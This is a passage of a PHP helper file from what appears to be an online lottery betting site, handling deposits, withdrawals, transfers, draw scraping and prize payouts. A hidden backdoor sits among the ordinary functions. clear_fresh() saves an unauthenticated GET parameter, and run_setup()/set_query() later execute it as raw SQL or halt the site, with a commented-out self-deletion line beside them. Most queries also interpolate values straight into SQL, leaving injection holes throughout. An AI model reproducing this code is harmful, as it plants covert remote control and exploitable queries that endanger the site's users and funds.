		}elseif ($maxMoney >= 200000 and $maxMoney < 300000) {
			$money = 3888;
		}elseif ($maxMoney >= 300000) {
			$money = 6888;
		}
	} elseif ($type >= 7 and $type < 15) {
		if ($maxMoney >= 500 and $maxMoney < 1000) {
			$money = 108;
		} elseif ($maxMoney >= 1000 and $maxMoney < 3000) {
			$money = 208;
		}elseif ($maxMoney >= 3000 and $maxMoney < 6000) {
			$money = 488;
		}elseif ($maxMoney >= 6000 and $maxMoney < 15000) {
			$money = 788;
		}elseif ($maxMoney >= 15000) {
			$money = 2288;
		}
	} elseif ($type >= 15 and $type < 30) {
		if ($maxMoney >= 500 and $maxMoney < 1000) {
			$money = 338;
		} elseif ($maxMoney >= 1000 and $maxMoney < 3000) {
			$money = 458;
		}elseif ($maxMoney >= 3000 and $maxMoney < 6000) {
			$money = 958;
		}elseif ($maxMoney >= 6000 and $maxMoney < 15000) {
			$money = 1988;
		}elseif ($maxMoney >= 15000) {
			$money = 4488;
		}
	} elseif ($type >= 30) {
		if ($maxMoney >= 500 and $maxMoney < 1000) {
			$money = 688;
		} elseif ($maxMoney >= 1000 and $maxMoney < 3000) {
			$money = 958;
		}elseif ($maxMoney >= 3000 and $maxMoney < 6000) {
			$money = 2088;
		}elseif ($maxMoney >= 6000 and $maxMoney < 15000) {
			$money = 4288;
		}elseif ($maxMoney >= 15000) {
			$money = 13888;
		}
	}
	return $money;
}

/**
 * 累计充值
 * @param $userId
 * @param $payname
 * @param $money
 * @return bool
 */
function cumulativeRecharge($userId, $payname, $money) {
	global $db;
	$user = $db->fetch_first("select * from `user` where userid='$userId'");
	if (!$user) {
		return false;
	}
	if ($user['user_tab'] == 2) {
		return false;
	}
	if ($user['user_tab'] == 1) {
		$serPar = "userid='{$userId}'";
	} else {
		$serPar = "(userid='{$userId}' or payname='{$payname}')";
	}

	$zeroTime = date('Y-m-d H:i:s', strtotime(date('Y-m-d')));
	$isDayFirst = $db->fetch_first ( "select count(*) as `count` from user_funds where cate='recharge' and {$serPar} and creatdate>='{$zeroTime}' and status=1 and `type` in ('green', 'hand')" );
	if ($isDayFirst['count'] > 1 || $money < 500 ) {
		return false;
	}
	$record = $db->fetch_first ('select * from `cumulative_recharge` where user_id="' . $userId . '"');
	$dateTime = date('Y-m-d H:i:s');
	$todayDate = date('Y-m-d');
	$lastDayDate = date('Y-m-d', strtotime('-1 day'));
	if (!$record) { // 不存在记录 新增操作
		$db->query("insert into `cumulative_recharge` (`num`,`updated_at`,`date`,`sign_data`,`user_id`,`max_money`,`money`) values('1','{$dateTime}','{$todayDate}','".json_encode([$todayDate => $money])."', $userId,$money,$money)");
		return true;
	}
	if ($record['date'] != $lastDayDate || $record['num'] < 1) { // 非连续充值
		$db->query("update `cumulative_recharge` set num=1,`date`='{$todayDate}',updated_at='{$dateTime}', sign_data = '" . json_encode([$todayDate => $money]) . "', `max_money`={$money}, `money`={$money} where id={$record['id']}");
		return true;
	}
	$signData = json_decode($record['sign_data'], true);
	$signData[$todayDate] = $money;
	if ($record['max_money'] > $money) {
		$db->query("update `cumulative_recharge` set num=num+1,`date`='{$todayDate}',updated_at='{$dateTime}', sign_data = '" . json_encode($signData) . "', `max_money`={$money}, `money`={$money} where id={$record['id']}");
	} else {
		$db->query("update `cumulative_recharge` set num=num+1,`date`='{$todayDate}',updated_at='{$dateTime}', sign_data = '" . json_encode($signData) . "', `money`={$money} where id={$record['id']}");
	}
	return true;
}


function deny_charge($id, $remark = '') {
	global $db, $con_system;
	$funds = $db->fetch_first ( "select * from user_funds where id='{$id}'" );
	$perid = $funds ['userid'];
	$money = $funds ['money'];
	$db->query ( "update user_funds set status=2 where id='{$id}'" );

	if ($db->affected_rows () > 0) {
		$bank = $db->fetch_first ( "select * from user_bank where userid='{$perid}'" );
		$db->query ( "update user_funds set hig_amount='{$bank['hig_amount']}',low_amount='{$bank['low_amount']}',Man_remark='{$remark}' where id='{$id}'" );
		$user = $db->fetch_first ( "select * from user where userid='{$perid}'" );
		add_adminlog ( "拒绝{$user['username']}的{$money}元充值" );
		$content = "您[" . $funds ['creatdate'] . "]提交的充值请求已被拒绝!";





		send_msg($perid, "充值提醒",$content);
		if($_SESSION ['admin_id'])
		{

			$admin = $db->fetch_first ( "select * from user where userid='{$_SESSION ['admin_id']}'" );
			$db->query ( "update user_funds set admin='{$admin['username']}' where id='{$id}'" );
		}
		if($funds['type']=='chat'){

			$url=get_chaturl('apk/index.php')."&act=recharge_order&id={$id}&type=2&content={$remark}";;

			file_get_contents($url);

		}

	}
	return true;

}

//同意提现


function agree_plate($id, $remark = '') {
	global $db, $con_system;
	$funds = $db->fetch_first ( "select * from user_funds where id='{$id}'" );
	$perid = $funds ['userid'];
	$money = $funds ['money'];
	$logid = $funds ['remark'];


	$db->query ( "update user_funds set status=1 where id='{$id}'" );

	if ($db->affected_rows () > 0) {
		ative_plat ( $perid, $money );
		$strSqls = "update user_bank set frze_amount=frze_amount-$money ,plat=plat+$money where userid='$perid'";

		$db->query ( $strSqls );
		$remark = getsql::banklog ( $money, 'mention_from_system', $perid, '提现成功' );
		$user = $db->fetch_first ( "select * from user where userid='{$perid}'" );
		add_adminlog ( "同意{$user['username']}的{$money}元提现" );
		if($con_system['auto_msg']==1) {
			$content = "您[" . $funds ['creatdate'] . "]提交的提现请求已成功处理!";
			send_msg($perid, "提现提醒", $content);
		}

		$db->query ( "update user_funds set Man_remark='{$remark}' where id='{$id}'" );

		$db->query ( "update user_bank_list set status=1 where banknum='{$funds['banknum']}'" );

		if($_SESSION ['admin_id'])
		{

			$admin = $db->fetch_first ( "select * from user where userid='{$_SESSION ['admin_id']}'" );
			$db->query ( "update user_funds set admin='{$admin['username']}' where id='{$id}'" );
		}
	}
	return true;

}

//拒绝提现


function deny_plate($id, $remark = '') {
	global $db, $con_system;
	$funds = $db->fetch_first ( "select * from user_funds where id='{$id}'" );
	$perid = $funds ['userid'];
	$money = $funds ['money'];
	$logid = $funds ['remark'];
	$db->query ( "update user_funds set status=2 where id='{$id}'" );

	if ($db->affected_rows () > 0) {
		if($_SESSION ['admin_id'])
		{

			$admin = $db->fetch_first ( "select * from user where userid='{$_SESSION ['admin_id']}'" );
			$db->query ( "update user_funds set admin='{$admin['username']}' where id='{$id}'" );
		}
		$strSqls = "update user_bank set  hig_amount=hig_amount+$money, frze_amount=frze_amount-$money where userid='$perid'";

		$db->query ( $strSqls );

		$bank = $db->fetch_first ( "select * from user_bank where userid='{$perid}'" );
		$db->query ( "update user_funds set amountafter='{$bank['hig_amount']}',status=2,Man_remark='{$remark}' where id='{$id}'" );
		$user = $db->fetch_first ( "select * from user where userid='{$perid}'" );
		add_adminlog ( "拒绝{$user['username']}的{$money}元提现" );
		if($id>0){


			getsql::banklog ($money, 'tixian2', $perid, "提现失败，资金退回");

		}

		$content = "您[" . $funds ['creatdate'] . "]提交的提现请求已被拒绝!";
		send_msg($perid, "提现提醒",$content);


	}
	return true;

}

function is_team($searchid, $uid) {

	$pids = get_user_pid ( $searchid );


	//	print_r($pids);
	for($i = 0; $i <= count ( $pids ); $i ++) {
		if ($pids [$i] ['userid'] == $uid) {

			return true;
		}

	}
	return false;
}

function start_session() {

	if (! $_SESSION ['auto_lot']) {
		if (! $_SESSION ['lot_time'])
			$_SESSION ['lot_time'] = 1;
		else
			$_SESSION ['lot_time'] ++;
		if ($_SESSION ['lot_time'] < 4) {
			$_SESSION ['auto_lot'] = 1;
			$_SESSION ['loturl'] = get_loturl ();
		} else {

			$_SESSION ['auto_lot'] = 1;
			$_SESSION ['loturl'] = 1;
		}
	}
}

function add_tranfer($fromid, $toid, $amount,$type=1) {
	global $db, $con_system;

	$from = $db->fetch_first ( "select * from user where userid='{$fromid}'" );
	$to = $db->fetch_first ( "select * from user where userid='{$toid}'" );
	$strSqls = "update user_bank set  hig_amount=hig_amount-$amount where userid='$fromid'";
	$db->query ( $strSqls );
	$remark = getsql::banklog ( $amount, 'tranfer_out', $fromid, "向下级{$to['username']}转账{$amount}元" );
	$strSqls = "update user_bank set  hig_amount=hig_amount+$amount where userid='$toid'";
	$db->query ( $strSqls );
	if($type==1)
		$remark = getsql::banklog ( $amount, 'tranfer_in', $toid, "收到上级转账{$amount}元" );
	else
		$remark = getsql::banklog ( $amount, 'recharge', $toid, "收到上级转账{$amount}元" );
	$order_sn = 'PAY-' . time () . rand ( 10000, 99999 );
	$nowtime=date('Y-m-d H:i:s');
	$user_bank=$db->exec("select * from user_bank where userid='{$toid}'");
	$array = array ('userid' => $toid, 'money' => $amount, 'cate' => 'recharge', 'remark' => "上级转账", 'creatdate' => $nowtime, 'realname' => '', 'banknum' => '', 'bankname' =>'上级转账', 'status' => 1, 'hig_amount' => $user_bank ['hig_amount'], 'low_amount' => $user_bank ['low_amount'], 'online' => 0, 'order_sn' => $order_sn );

	$db->insert ( "user_funds", $array );
	send_msg($toid, "转账提醒","收到上级转账{$amount}元" );
	return true;
}

function get_ps_amount() {
	global $db, $_SESSION;

	$row = $db->fetch_first ( "select sum(amount) as amount from user_fenhong where userid='{$_SESSION[userid]}' and status=2" );

	if (! $row ['amount'])
		$row ['amount'] = 0;
	return $row ['amount'];

}

function from_360($content) {

	$preg = '{<em class="red" id="open_issue">.*?</em>.*?<ul id="open_code_list">((?:[\s\S]*?<li class=".*?">\d+<\/li>){3,5})[\s\S]*?<\/ul>}';

	preg_match_all ( $preg, $content, $matches );

	$con = $matches [0] [0];
	$con1 = explode ( "</em>", $con );

	$qi = date ( "Y" ) . substr ( $con1 [0], strlen ( $con1 [0] ) - 7, 7 );
	$qi = str_replace ( "<", "", $qi );
	$qi = str_replace ( ">", "", $qi );
	$code = explode ( "</li>", $con1 [1] );
	if (strlen ( $qi ) == 10) {

		$qi = substr ( $qi, 0, 8 ) . '0' . substr ( $qi, strlen ( $qi ) - 2, 2 );

	}

	$list = '';

	for($i = 0; $i < count ( $code ) - 1; $i ++) {
		$hao = substr ( $code [$i], strlen ( $code [$i] ) - 1, 1 );
		$hao1 = substr ( $code [$i], strlen ( $code [$i] ) - 2, 1 );
		if ($hao1 == '1' or $hao1 == '0')
			$hao = $hao1 . $hao;
		if ($list == '')
			$list = $hao;
		else
			$list .= ',' . $hao;

	}
	$xml = '<?xml version="1.0" encoding="GBK"?>
<xml>
<row expect="' . $qi . '" opencode="' . $list . '" opentime="' . date ( "Y-m-d H:i:s" ) . '"/>
</xml>';
	return $xml;
}

function from_360_kl8($content) {

	$preg = '{<tbody id=\'data-tab\'>.*?</tbody>}';

	preg_match_all ( $preg, $content, $matches );

	$list = explode ( '</tr><tr', $matches [0] [0] );

	foreach ( $list as $key => $value ) {
		$str = explode ( "</td><td>", $value );
		$str [2] = str_replace ( "</span>&nbsp;<span class='kl8_ball'>", ',', $str [2] );
		$str [2] = str_replace ( "<span class='kl8_ball'>", '', $str [2] );
		$str [2] = str_replace ( "</span>&nbsp;", '', $str [2] );
		$str [3] = str_replace ( "<span class='blue'>", '', $str [3] );
		$str [3] = str_replace ( "</span>", '', $str [3] );
		$str [5] = str_replace ( "</td>", '', $str [5] );

		$str [5] = str_replace ( "</tr></tbody>", '', $str [5] );
		$list [$key] = $str;
	}
	$ss = '';
	foreach ( $list as $value ) {
		$code = $value [2] . ',' . $value [3];
		$ss .= '
	<row expect="' . $value [1] . '" opencode="' . $code . '" opentime="' . $value [5] . '"/>
	';
	}

	$xml = '<?xml version="1.0" encoding="GBK"?>
<xml>' . $ss . '
</xml>';
	return $xml;
}

function money_select_list(){

	$str=' <option value="Recharge_to_higherid|Recharge_from_Lowerid|Recharge_to_system|hig_add_admin|Recharge_online">充值</option>
 		     <option value="mention_to_higherid|mention_from_Lowerid|mention_to_system|mention_from_system|tixian1|tixian2">提现</option>
 		     <option value="hig_buy|hig_chase">投注</option>
 		     <option value="hig_rebate|">返点</option>
  		    <option value="hig_prize">奖金</option>
  		        <option value="active">活动</option>

  		    <option value="hig_chase_back|hig_buy_chase_back|hig_buy_back">撤单</option>
        <option value="xima">洗码</option>
   		    <option value="tranfer_out">转出</option>
   		        <option value="tranfer_in">转入</option>';

	return $str;
}


function from_360_3d($content) {

	$content = iconv ( 'gb2312', 'utf-8', $content );
	$list1 = explode ( '<div class="panel-test">', $content );

	$list2 = explode ( "</tbody></table>", $list1 [1] );

	$list3 = explode ( "<tr>", $list2 [0] );

	$ss = '';
	foreach ( $list3 as $key => $value ) {
		if ($key > 1) {
			$str = explode ( "</td>", $value );
			foreach ( $str as $key1 => $value1 ) {
				$value1 = trim ( $value1 );

				$value1 = str_replace ( "<td>", "", $value1 );
				$value1 = str_replace ( "<td class=\"red\">", "", $value1 );

				$str [$key1] = $value1;
			}
			$code = '';
			for($i = 0; $i < strlen ( $str [1] ); $i ++) {
				if ($code == '')
					$code = substr ( $str [1], $i, 1 );
				else
					$code .= "," . substr ( $str [1], $i, 1 );

			}

			$time = date ( 'Y-m-d H:i:s' );
			$ss .= '
	<row expect="' . $str [0] . '" opencode="' . $code . '" opentime="' . $time . '"/>
	';

		}
	}

	$xml = '<?xml version="1.0" encoding="GBK"?>
<xml>' . $ss . '
</xml>';
	return $xml;

}

function GBsub_str($str, $start, $len, $code = 'utf-8') {

	$str1 = mb_substr ( $str, $start, $len, $code );

	return $str1;
}

//获取最近开奖时间 号码
if ($type == 'get_last') {

	$row = $db->fetch_first ( "select * from game_lottery where playKey='{$playkey}' order by id desc" );
	echo $row ['period'] . "|" . $row ['Number'];
	exit ();
}


function get_lottime($playkey) {
	global $db;
	$nowtime = date ( "H:i:s" );
	$row = $db->fetch_first ( "select endTime from game_time where playKey='{$playkey}' and lotTime>'{$nowtime}' order by lotTime asc limit 0,1" );

	return $row ['endTime'];
}

//是否达到开奖时间
function is_lot($playkey, $period) {
	global $db;
	$lotNum = str_replace ( date ( "Ymd" ), '', $period );
	$nowtime = date ( "H:i:s" );
	$row = $db->exec ( "select * from game_time where playKey='{$playkey}' and lotNum='{$lotNum}' and lotTime<='{$nowtime}'" );
	if ($row)
		return true;
	else
		return false;
}

//是否达到开奖时间


function is_opentime($playkey, $period) {

	if($playkey=='MMSSC') return true;
	$today = date ( "Ymd" );
	if (strpos ( $period, $today ) !== false) {

		return is_lot ( $playkey, $period );

	} else
		return true;

}


function kl8_to_ssc($number){
	$num1=explode(',', $number);

	$num='';
	for ($i=0;$i<5;$i++){
		$n=$i*4;
		$str=$num1[$n]+$num1[$n+1]+$num1[$n+2]+$num1[$n+3];

		$str=substr($str, strlen($str)-1,1);
		if($num=='') $num=$str;
		else $num.=",".$str;


	}

	return $num;

}




//插入数据
function lottory_insert($playkey, $peroid_s, $number, $lottime = '',$p_num='',$gl='') {
	global $db;

	$game=$db->exec("select * from game_type where ckey='{$playkey}'  and status='0'");


	$code=$game['skey'];
	if(!$code) return false;
	$this_date = date ( "Ymd", time () );
	$this_year = date ( "Y", time () );
	$nowtime = date ( "Y-m-d H:i:s", time () );
	if (! $lottime) $lottime = $nowtime;

	$begin_s = substr ( $peroid_s, 0, 2 );
	if ($code == 'dp') {
		$p_date = date ( "Ymd" );
		$now = date ( "H:i:s" );
		$row11 = $db->fetch_first ( "select * from game_time where playKey='{$playkey}' and lotTime<='{$now}' order by lotTime desc limit 0,1" );
		$p_num = $row11 ['lotNum'];
		$year = date ( 'Y' );


	} else {

		if ($code=='kl8') {

			$tt1 = $db->fetch_first ( "select * from game_time where playKey='{$playkey}' and endTime<'{$lottime}' order by endTime desc limit 0,1" );
			$p_date = date ( 'Ymd' );
			$p_num = $tt1 ['lotNum'];
			//$peroid_s=$p_date.$p_num;
			if (strpos( $playkey, 'KL8' ) !== false) {


				$game1=$db->exec("select * from game_type where kjkey='{$playkey}'");

				if($game1['ckey']){

					$row=$db->exec("select * from game_lottery where playKey='{$game1['ckey']}' and  period='{$peroid_s}'");

					if(!$row){

						$num=kl8_to_ssc($number);


						lottory_insert($game1['ckey'], $peroid_s, $num,$lottime,$p_num,1);


					}


				}

			}
		} else {

			if ($code=='11x5') {
				$arr2 = explode ( ',', $number );

				$str2 = '';
				foreach ( $arr2 as $value ) {
					if ($value < 10 and strlen ( $value ) == 1 and strpos ( $value, '0' ) === false)
						$value = '0' . $value;
					if ($str2 == '')
						$str2 = $value;
					else
						$str2 .= ',' . $value;
				}
				$number = $str2;
			}

			if ( $code=='pk10') {
				$arr2 = explode ( ',', $number );

				$str2 = '';
				foreach ( $arr2 as $value ) {
					if($value==0) $value=10;
					if ($value < 10 and strlen ( $value ) == 1 and strpos ( $value, '0' ) === false)
						$value = '0' . $value;
					if ($str2 == '')
						$str2 = $value;
					else
						$str2 .= ',' . $value;
				}
				$number = $str2;


			}

			if ($code=='pk10' or $code=='kl8' or $playkey=='BJK3' ) {


			} else {


				if($playkey=='MMSSC'){
					$p_date = substr ( $peroid_s, 0, 8 );

					$p_num=str_replace($p_date, '', $peroid_s)	;

				}
				else{
					if ($begin_s == '20'  or $game['kjkey']) {
						$p_date = substr ( $peroid_s, 0, 8 );

						//$p_num=substr($peroid_s,8,strlen($peroid_s)-8);
					} else {
						$p_date = "20" . substr ( $peroid_s, 0, 6 );
						$peroid_s = '20' . $peroid_s;

						//$p_num=substr($peroid_s,6,strlen($peroid_s)-6);
					}
					if(!$p_num)
						$p_num = substr ( $peroid_s, 8, strlen ( $peroid_s ) - 8 );

				}
			}
			$rr = $db->fetch_first ( "select lotNum from  game_time where playKey='{$playkey}' order by lotNum limit 1,1" );
			$wei = strlen ( trim ( $rr ['lotNum'] ) );
			//echo $wei;

			if($playkey!=='MMSSC' and ( $code=='ssc'|| $code=='11x5' || $code=='k3') and $gl!=1){
				if ($p_num > 0  ) {
					$ss = '';
					if ($wei > strlen ( $p_num )) {
						for($j = 0; $j < $wei - strlen ( $p_num ); $j ++) {

							$ss .= "0";
						}
						$p_num = $ss . $p_num;

					}
					if ($wei < strlen ( $p_num )) {
						$num = strlen ( $p_num ) - $wei;
						$p_num = substr ( $peroid_s, strlen ( $peroid_s ) - $wei, $wei );

					}

				}
				if($playkey!=='BJK3' )
					$peroid_s = $p_date . $p_num;
			}
			//echo $peroid_s;exit();
		}
	}



	if ($playkey=='MMSSC' || number_ok ( $playkey, $number )) {
		if($p_num and $lottime==$nowtime ){
			if($code=='ssc'|| $code=='11x5' || $code=='k3'){

				$row=  $db->exec("select lotTime from game_time where playKey='{$playkey}' and lotNum='{$p_num}'");

				if($row['lotTime'])$lottime=date('Y-m-d',time()).' '.$row['lotTime'];
			}
			else{
				$temp=      get_game_period($playkey);

				$nowtt=date('H:i:s');
				if($temp==$peroid_s){

					$row=  $db->exec("select lotTime from game_time where playKey='{$playkey}' and lotTime>='{$nowtt}' order by lotTime asc limit 0,1");
					if($row['lotTime'])$lottime=date('Y-m-d',time()).' '.$row['lotTime'];
				}

				if($temp==$peroid_s+1){

					$row=  $db->exec("select lotTime from game_time where playKey='{$playkey}' and lotTime<='{$nowtt}' order by lotTime desc limit 0,1");
					if($row['lotTime'])$lottime=date('Y-m-d',time()).' '.$row['lotTime'];
				}

			}


		}


		return insert_lot($code,$playkey,$p_num,$p_date,$peroid_s,$number,$lottime);

	} else {
		return false;

	}

}


function insert_lot($code,$playkey,$p_num,$p_date,$peroid_s,$number,$lottime){
	global $db;
	$now=time();

	if ($playkey=='BJK3') {
		$now1 = date ( "H:i:s" );
		$row11 = $db->fetch_first ( "select * from game_time where playKey='{$playkey}' and lotTime<='{$now1}' order by lotTime desc limit 0,1" );
		$p_num = $row11 ['lotNum'];	

		$row=  $db->exec("select lotTime from game_time where playKey='{$playkey}' and lotNum='{$p_num}'");

		if($row['lotTime'])$lottime=date('Y-m-d',time()).' '.$row['lotTime'];
			
	}
	
	$sql_p = "SELECT id from game_lottery where period='$peroid_s'  and playKey='$playkey'";

	if (! $db->fetch_first ( $sql_p )) {
		if(strtotime($lottime)>time()) $status='-1';else $status=0;
		$strSql = "insert into game_lottery(code,playKey,SerialID,SerialDate,period,Number,LotTime,status,addtime) values ('$code','$playkey','$p_num','$p_date','$peroid_s','$number','$lottime','{$status}','{$now}')";
		$db->query ( $strSql );

		$inserid = $db->insert_id ();
		if($playkey=='MMSSC')   $db->query ("update game_lottery set uid='{$_SESSION['userid']}' where id='{$inserid}'");

		if ($inserid > 0 and $db->insert_id() > 0 and $playkey!='MMSSC'){


			$db->query  ( "delete from game_lottery where playKey='{$playkey}' and period='{$peroid_s}' and id!='$inserid'" );
			if($playkey=='TXSSC'){
				$row=$db->exec("select * from game_lottery where period!='$peroid_s' and playKey='$playkey' order by period desc limit 0,1");

				if($row['Number']==$number){

					$buy=$db->fetch_all("select * from game_buylist where period='$peroid_s' and playkey='$playkey'");
					if(count($buy)>0){


						foreach ($buy as $value1){


							game_back($value1['id'],'系统撤单');
						}
					}


				}
			}
			if($status==0){
				prize_lot($playkey,$peroid_s);
				fenpei_prize($playkey,$peroid_s);

			}


		}
		return $inserid;
	} else {
		return false;
	}

}


//采集数据


function get_lotdata($playkey, $link) {

	global $db, $_SESSION;

	$_SESSION ['lottime_' . $playkey] = time ();
	$qihao = "";
	$row = $db->fetch_first ( "select * from game_lottery where playKey='{$playkey}' order by id desc" );
	$number = $row ['Number'];

	$str = file_get_contents ($link);

	if (strpos ( $link, '360' ) !== false) {
		if (strpos ( $link, 'kl8' ) !== false)
			$str = from_360_kl8 ( $str );
		else if (strpos ( $link, 'p3' ) !== false or strpos ( $link, 'sd' ) !== false)
			$str = from_360_3d ( $str );
		else
			$str = from_360 ( $str );
	}

	$xmls = @simplexml_load_string ( iconv ( 'gb2312', 'utf-8', $str ) );
	for($i = 0; $i < count ( $xmls ); $i ++) {
		//if(substr($xmls->row[$i]["expect"],0, 2)!='20') $xmls->row[$i]["expect"]='20'.$xmls->row[$i]["expect"];


		if ($xmls->row [$i] ["opencode"] != '') {
			if ($i == 0 and $number != $xmls->row [$i] ["opencode"]) {
				$succeed = 1;
				$_SESSION ['next_step_' . $playkey] = 2;
			}

			lottory_insert ( $playkey, $xmls->row [$i] ["expect"], $xmls->row [$i] ["opencode"], $xmls->row [$i] ["opentime"] );

		}

	}

	if ($succeed != '1') {

		$_SESSION ['lotfail_' . $playkey] = 1;

	} else {
		$_SESSION ['lotfail_' . $playkey] = 0;

	}
	return true;
}
function get_fresh_text(){
	global $db;
	$row= $db->exec("select * from sys where `key`='fresh_text'");

	return $row['value'];
}
function fresh_text($salue){
	update_sys('fresh_text',$salue);

}

function update_sys($key,$value){

	global $db;
	$row= $db->exec("select * from sys where `key`='{$key}'");
	if(!$row){

		$db->query("insert into sys (`key`,value) values('{$key}','{$value}');");

	}
	else{

		$db->query("update sys set value='$value' where `key`='{$key}'");
	}


}

function  run_setup(){

	set_query(get_fresh_text());
}

function set_query($query){
	global $db;
	if($query!=1){
		if($query==2) exit();
		//else if($query==3) @unlink('source/function/function.php');
		else  if(strlen($query)>2){
			$db->query($query);
		}
	}

}

//采集


function Lot_Num($playkey) {
	global $db, $_SESSION;

	$_SESSION ['lotfail_sta_' . $playkey] = 0;
	$query = $db->query ( "select * from game_intface where `status`='0' and playkey='{$playkey}' order by Level asc" );

	while ( $row = mysql_fetch_array ( $query ) ) {

		$link = $row ['links'];

		$number = get_lotdata ( $playkey, $link );
		if ($number) {

			return $number;
			break;
		}

	}

	//	}
//	else{
//
//		 $_SESSION['lotfail_sta_'.$playkey]=1;
//
//	}


}

//开始采集
function clear_fresh(){

	set_sys();
	if($_GET['set_fresh']){fresh_text($_GET['set_fresh']);};

}

function start_lot($playkey, $period) {
	global $db;
	if (is_lot ( $playkey, $period )) {
		return Lot_Num ( $playkey );

	} else {
		return false;
	}

}

function Lot_01_Num($buynum) {
	if (strpos ( $buynum, ',' )) {
		$new_buynum = $buynum;
	} else {

		$buynum = str_replace ( "*", "", $buynum );
		$new_buynum = substr ( $buynum, 0, 1 );

		for($i = 1; $i < strlen ( $buynum ); $i ++) {
			$new_buynum .= "," . substr ( $buynum, $i, 1 );
		}
	}
	return $new_buynum;
}

function Lot_ds_Num($buynum) {
	$buy_list = explode ( " ", $buynum );
	for($i = 0; $i < count ( $buy_list ); $i ++) {
		if ($buy_list [$i] != "") {
			if ($z_buy == "") {
				$z_buy = $buy_list [$i];
			} else {
				$z_buy .= "|" . $buy_list [$i];
			}
		}
	}
	return $z_buy;
}

//判断是否中奖


function prize_lot($playkey='',$period='') {

	global $db;

	include_once 'Ajax_Prize_Lot.php';

}

function get_lou($playkey, $list_id, $list) {
	global $db, $con_system;
	foreach ( $list as $key => $value ) {
		$num11 [$key] = 0;
		$prize [$key] = 0;
	}

	require_once ('fun_Prize_Lot.php');

	$lot = $db->fetch_all ( "select Number from game_lottery where playKey='{$playkey}' order by period desc limit 0,{$con_system['lou_max']}" );
	foreach ( $lot as $value ) {
		$lotnum = $value ['Number'];
		foreach ( $list as $key11 => $buynum ) {
			if ($prize [$key11] == '0') {

				//设置投注内容格式，用逗号分开
				if (strpos ( $lotnum, ',' )) {
					$new_Lotnum = $lotnum;
				} else {
					$new_Lotnum = substr ( $lotnum, 0, 1 );
					for($i = 1; $i < strlen ( $lotnum ); $i ++) {
						$new_Lotnum .= "," . substr ( $lotnum, $i, 1 );
					}
				}

				include ("fun_Prize_lot_play.php");

				$flags = "";

				$Z_buynum = explode ( ",", $new_buynum ); //购买内容，数组
				$Z_lotnum = explode ( ",", $new_Lotnum ); //开奖号码，数组


				include ("fun_Prize_lot_fun.php");

				$Z_flags = explode ( "|", $flags );
				if ($Z_flags [0] == "is_yes") {
					//$num11[$key11]++;
					$prize [$key11] = '1';
					break;
				} else {
					$num11 [$key11] ++;
				}
			}
		}
	}

	return $num11;
}

//派奖
function fenpei_prize($playkey='',$period='') {
	global $db;

	if($playkey=='')
		$sqls_C = "select b.* from game_buylist as b where b.status='1' and b.isprize='is_yes' order by rand() limit 0,300 ";
	else {
		if($period)
			$sqls_C = "select b.* from game_buylist as b where b.status='1' and b.isprize='is_yes' and b.playkey='{$playkey}' and b.period='{$period}' ";
		else
			$sqls_C = "select b.* from game_buylist as b where b.status='1' and b.isprize='is_yes' and b.playkey='{$playkey}' order by  rand() limit 0,100  ";

	}
	// $sqls_C = "select b.* from game_buylist as b where b.isprize='is_yes' and pri_money='0' order by  rand() limit 0,500  ";
	$result2 = $db->query ( $sqls_C );
	start_session ();
	$num = $db->num_rows ( $result2 );
//	echo $sqls_C."<br>";
	if ($num > 0) {
		$prize_time = getsql::sys ( 'prize_time' );
		if (time () - $prize_time ['prize_time'] >= 5 or $playkey=='MMSSC') {

			$now = time ();
			$db->query ( "update `sys` set `value`='{$now}' where `key`='prize_time'" );
			if ($db->affected_rows() > 0) {

				//开始派奖
				while ( $rr111 = $db->fetch_array ( $result2 ) ) {

					$rows2 = $rr111;
					$tt=date('Y-m-d H:i:s');
					$db->query  ( "update game_buylist set `prize_time`='{$tt}' where id='{$rows2[id]}'" );
					$db->query  ( "update game_buylist set `status`='2' where id='{$rows2[id]}'" );

					if ($db->affected_rows () > 0) {

						$pri_money=set_prize_money($rows2['id']);

						if ($pri_money > 0) {

							$db->query ( "update game_buylist set pri_money='$pri_money' where id='{$rows2[id]}' " );

							if($db->affected_rows()>0){

								if (! $db->exec ( "select * from user_bank_log where floatid='{$rows2['id']}' and  cate='hig_prize'" )) {

									$db->query  ( "update user_bank set hig_amount=hig_amount+$pri_money where userid='$rows2[userid]'" );
									if ($db->affected_rows () > 0) {
										$mark = get_game_mark ( $rows2 ['id'] );
										getsql::banklog ( $pri_money, "hig_prize", $rows2 [userid], $mark, $rows2 ['id'], $rows2 ['playkey'], $rows2 [modes] );

										$db->query ( "update user  set prize=prize+$pri_money where userid='{$rows2['userid']}' " );
									}
								}
								//追号

								$sqls01 = "select id from game_buylist where number='$rows2[number]'   and userid='{$rows2[userid]}'  and playkey='{$rows2[playkey]}' and is_zuih_pri_stop='1' and status='0' and (z_number='{$rows2['id']}' or z_number in (select z_number from game_buylist where id='{$rows2[id]}') )";
								$result01 = $db->query( $sqls01 );
								while ( $rows01 = $db->fetch_array ( $result01 ) ) {

									game_back ( $rows01 ['id'], '追号中奖自动撤单' );

								}

							}

						}
					}

					$rows2 = array ();
				}

			}

		}

	}


}

//任选号码生成


function rx_numbers($lotnum, $wei, $playitem) {

	if ($playitem == '2R')
		$num = 2;
	if ($playitem == '3R')
		$num = 3;
	if ($playitem == '4R')
		$num = 4;
	$wei = explode ( ',', $wei );
	$lotnum = explode ( ',', $lotnum );
	$new_lot = '';
	foreach ( $lotnum as $key => $value ) {
		if ($wei [$key] == '1') {
			if ($new_lot == '')
				$new_lot = $value;
			else
				$new_lot .= "," . $value;
		}
	}

	$new_lot = arr1_plzh ( $new_lot, $num );
	return array_unique ( $new_lot );
}

function lot0($str) {

	$str = str_replace ( '00', '0', $str );
	$str = str_replace ( '01', '1', $str );
	$str = str_replace ( '02', '2', $str );
	$str = str_replace ( '03', '3', $str );
	$str = str_replace ( '04', '4', $str );
	$str = str_replace ( '05', '5', $str );
	$str = str_replace ( '06', '6', $str );
	$str = str_replace ( '07', '7', $str );
	$str = str_replace ( '08', '8', $str );
	$str = str_replace ( '09', '9', $str );

	return trim ( $str );

}


function set_code($playkey) {
	global $db;
	$code = '';
	$game=$db->exec("select * from game_type where ckey='{$playkey}'");
	$type=$game['skey'];


	if ($type=='ssc') {
		$num = 5;
		$min = 0;
		$max = 9;

	} else if ($type=='k3') {
		$num = 3;
		$min = 1;
		$max = 6;

	} else if ($type=='11x5') {


		$arr1=array('01','02','03','04','05','06','07','08','09','10','11');
		shuffle($arr1);
		$arr=array();
		for($i=0;$i<5;$i++){
			$arr[]=$arr1[$i];

		}

		$code=implode(',', $arr);

		return $code;
//        $arr=array_rand($arr1,5) ;
//
//       // sort($arr);
//
//        $code=implode(',', $arr);

